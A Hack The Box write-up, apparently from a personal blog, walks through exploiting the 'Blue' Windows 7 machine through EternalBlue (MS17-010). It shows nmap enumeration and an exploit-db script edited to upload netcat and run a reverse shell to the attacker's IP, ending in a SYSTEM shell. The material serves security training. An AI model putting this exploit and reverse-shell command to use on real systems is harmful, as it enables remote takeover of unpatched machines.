---
layout: post
title: Hack the Box - Blue
date: 2020-03-13 16:04:22 +0100
description: Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.
img: blue.png
fig-caption: Blue
categories: HackTheBox
tags: [Easy, Windows, Retired, CVE]
---
## Overview
Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.
## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~]
└─$ sudo nmap -p- -T4 -sV 10.129.112.220
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-13 18:53 GMT
Nmap scan report for 10.129.112.220
Host is up (0.094s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
```
From this we can see that the ports of most interest are 135,139,445. Before attempting to scan shares that might be accessible anonymously a quick vulnerability scan shows that the server is vulnerable to MS17-010, otherwise known as EternalBlue. With the box being named Blue it is safe to assume this is a sensible attack vector.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~]
└─$ sudo nmap -p139,445 --script vuln 10.129.112.225                                                                                                                                                                                   130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-13 19:36 GMT
Nmap scan report for 10.129.112.225
Host is up (0.016s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```
Having identified a route forward lets move on to the exploitation phase.
## Foothold
Search on exploitdb for an exploit for this vulnerability we find three to choose from.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~]
└─$ searchsploit eternalblue
----------------------------------------------------------------- --------------------------------
 Exploit Title                                                   |  Path
----------------------------------------------------------------- --------------------------------
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Ex   | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue'  | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote | windows_x86-64/remote/42030.py
----------------------------------------------------------------- --------------------------------
```
I chose to go with 42315, however it was written in Python 2.7 so to run this on my Kali instance with the least trouble I chose to use a docker container to run it inside.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~]
└─$ sudo docker run -it -v "$(pwd)"/hackthebox/blue:/blue --entrypoint /bin/bash python:2.7.18-stretch
root@79a4e2b0be9a:/# pip install impacket
```
The exploit needs a couple of edits in order to produce a shell. First of all the username needs to be provided which in this case would be "anonymous". Secondly we need to edit the lines in the function "smb_pwn" to execute a reverse shell.
```python
#       print('creating file c:\\pwned.txt on the target')
#       tid2 = smbConn.connectTree('C$')
#       fid2 = smbConn.createFile(tid2, '/pwned.txt')
#       smbConn.closeFile(tid2, fid2)
#       smbConn.disconnectTree(tid2)

        smb_send_file(smbConn, 'nc.exe', 'C', '/nc.exe')
        service_exec(conn, r'cmd /c c:\nc.exe -nv 10.10.14.27 2121 -e cmd.exe')
```
After running this exploit using the following command our netcat listener should receive a shell if it is listening on the same port.
```
root@79a4e2b0be9a:/blue# python blue.py 10.129.112.225
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: samr
Target is 64 bit
Got frag size: 0x10
...
Creating service ANJU.....
Starting service ANJU.....
```
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/blue]
└─$ nc -nlvp 2121
listening on [any] 2121 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.112.225] 49159
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Administrator\Desktop>whoami
whoami
nt authority\system
```
## Privilege Escalation
As we attained root from this exploit and have access to the root flag, there is no need for privilege escalation.